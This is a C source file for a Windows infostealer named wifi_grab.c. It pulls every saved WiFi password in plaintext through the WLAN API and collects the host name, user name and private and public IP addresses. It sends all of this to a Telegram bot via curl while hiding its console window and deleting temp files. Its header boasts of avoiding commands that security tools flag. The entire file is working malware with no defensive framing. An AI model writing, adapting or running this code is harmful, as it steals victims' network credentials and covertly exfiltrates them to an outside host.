/*
 * wifi_grab.c — Extracts WiFi passwords via Windows WLAN API
 * Sends results to Telegram bot
 * 
 * This calls the same Windows API that Windows itself uses
 * to manage WiFi — no netsh, no PowerShell, no flagged commands.
 * 
 * Compile: gcc wifi_grab.c -o wifi_grab.exe -lwlanapi -lwinhttp -lole32
 */

#include <windows.h>
#include <wlanapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winhttp.h>

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "winhttp.lib")

// Telegram config
#define BOT_TOKEN "YOUR_BOT_TOKEN_HERE"
#define CHAT_ID "YOUR_CHAT_ID_HERE"

// Write results to a temp file
void grab_wifi(const char *outpath) {
    HANDLE hClient = NULL;
    DWORD dwVersion = 0;
    DWORD dwResult = 0;
    
    FILE *fp = fopen(outpath, "w");
    if (!fp) return;
    
    // Get computer name
    char compName[256];
    DWORD compSize = sizeof(compName);
    GetComputerNameA(compName, &compSize);
    
    char userName[256];
    DWORD userSize = sizeof(userName);
    GetUserNameA(userName, &userSize);
    
    fprintf(fp, "=== WiFi Passwords ===\n");
    fprintf(fp, "Computer: %s\n", compName);
    fprintf(fp, "User: %s\n", userName);

    // Get private IP
    char tp[MAX_PATH];
    GetTempPathA(MAX_PATH, tp);
    char ipCmd[256];
    snprintf(ipCmd, sizeof(ipCmd), "ipconfig | findstr /i \"IPv4\" > %sipv4.txt", tp);
    system(ipCmd);
    char ipFile2[MAX_PATH];
    snprintf(ipFile2, MAX_PATH, "%sipv4.txt", tp);
    FILE *ipf2 = fopen(ipFile2, "r");
    if (ipf2) {
        char line[256];
        fprintf(fp, "Private IPs:\n");
        while (fgets(line, sizeof(line), ipf2)) {
            fprintf(fp, "  %s", line);
        }
        fclose(ipf2);
        DeleteFileA(ipFile2);
    }
    fprintf(fp, "\n");
    
    // Open WLAN handle
    dwResult = WlanOpenHandle(2, NULL, &dwVersion, &hClient);
    if (dwResult != ERROR_SUCCESS) {
        fprintf(fp, "Error: Could not open WLAN handle (%lu)\n", dwResult);
        fclose(fp);
        return;
    }
    
    // Enumerate interfaces
    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
    if (dwResult != ERROR_SUCCESS) {
        fprintf(fp, "Error: Could not enum interfaces (%lu)\n", dwResult);
        WlanCloseHandle(hClient, NULL);
        fclose(fp);
        return;
    }
    
    // For each interface
    for (DWORD i = 0; i < pIfList->dwNumberOfItems; i++) {
        PWLAN_INTERFACE_INFO pIfInfo = &pIfList->InterfaceInfo[i];
        
        // Get profile list
        PWLAN_PROFILE_INFO_LIST pProfileList = NULL;
        dwResult = WlanGetProfileList(hClient, &pIfInfo->InterfaceGuid, NULL, &pProfileList);
        if (dwResult != ERROR_SUCCESS) continue;
        
        // For each profile
        for (DWORD j = 0; j < pProfileList->dwNumberOfItems; j++) {
            PWLAN_PROFILE_INFO pProfile = &pProfileList->ProfileInfo[j];
            
            // Get profile XML (contains password in plaintext)
            LPWSTR pProfileXml = NULL;
            DWORD dwFlags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
            DWORD dwAccess = 0;
            
            dwResult = WlanGetProfile(hClient, &pIfInfo->InterfaceGuid,
                pProfile->strProfileName, NULL, &pProfileXml, &dwFlags, &dwAccess);
            
            if (dwResult == ERROR_SUCCESS && pProfileXml) {
                // Extract SSID name
                char ssid[256];
                wcstombs(ssid, pProfile->strProfileName, sizeof(ssid));
                
                // Find keyMaterial in XML (the password)
                wchar_t *keyStart = wcsstr(pProfileXml, L"<keyMaterial>");
                wchar_t *keyEnd = wcsstr(pProfileXml, L"</keyMaterial>");
                
                if (keyStart && keyEnd) {
                    keyStart += wcslen(L"<keyMaterial>");
                    int keyLen = (int)(keyEnd - keyStart);
                    char key[256] = {0};
                    wcstombs(key, keyStart, keyLen < 255 ? keyLen : 255);
                    fprintf(fp, "%-32s | %s\n", ssid, key);
                } else {
                    fprintf(fp, "%-32s | (open/no password)\n", ssid);
                }
                
                WlanFreeMemory(pProfileXml);
            }
        }
        
        if (pProfileList) WlanFreeMemory(pProfileList);
    }
    
    if (pIfList) WlanFreeMemory(pIfList);
    WlanCloseHandle(hClient, NULL);
    fclose(fp);
}

// Send file to Telegram using curl (simpler than WinHTTP for multipart)
void send_telegram(const char *filepath) {
    char cmd[2048];
    char compName[256], userName[256], pubIP[64] = {0};
    DWORD s1 = sizeof(compName), s2 = sizeof(userName);
    GetComputerNameA(compName, &s1);
    GetUserNameA(userName, &s2);

    // Get public IP
    system("C:\\Windows\\System32\\curl.exe -s ipinfo.io/ip > %temp%\\ip.txt 2>nul");
    char ipFile[MAX_PATH];
    GetTempPathA(MAX_PATH, ipFile);
    strcat(ipFile, "ip.txt");
    FILE *ipf = fopen(ipFile, "r");
    if (ipf) { fgets(pubIP, sizeof(pubIP), ipf); fclose(ipf); DeleteFileA(ipFile); }
    char *nl = strchr(pubIP, '\n'); if (nl) *nl = 0;
    nl = strchr(pubIP, '\r'); if (nl) *nl = 0;

    // Get private IP
    char privIP[64] = {0};
    system("powershell -c \"(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notmatch '127.0.0.1'} | Select-Object -First 1).IPAddress\" > %temp%\\priv.txt 2>nul");
    char privFile[MAX_PATH];
    GetTempPathA(MAX_PATH, privFile);
    strcat(privFile, "priv.txt");
    FILE *pf = fopen(privFile, "r");
    if (pf) { fgets(privIP, sizeof(privIP), pf); fclose(pf); DeleteFileA(privFile); }
    nl = strchr(privIP, '\n'); if (nl) *nl = 0;
    nl = strchr(privIP, '\r'); if (nl) *nl = 0;

    snprintf(cmd, sizeof(cmd),
        "C:\\Windows\\System32\\curl.exe -s -F \"chat_id=" CHAT_ID "\" "
        "-F \"document=@%s\" "
        "-F \"caption=WiFi_%s@%s [pub:%s priv:%s]\" "
        "\"https://api.telegram.org/bot" BOT_TOKEN "/sendDocument\" >nul 2>nul",
        filepath, userName, compName, pubIP, privIP);
    system(cmd);
}

int main() {
    // Hide console window
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);

    char outFile[MAX_PATH];
    snprintf(outFile, MAX_PATH, "%swg.txt", tempPath);

    // Grab WiFi passwords
    grab_wifi(outFile);

    // Send to Telegram
    send_telegram(outFile);

    // Clean up
    DeleteFileA(outFile);

    return 0;
}
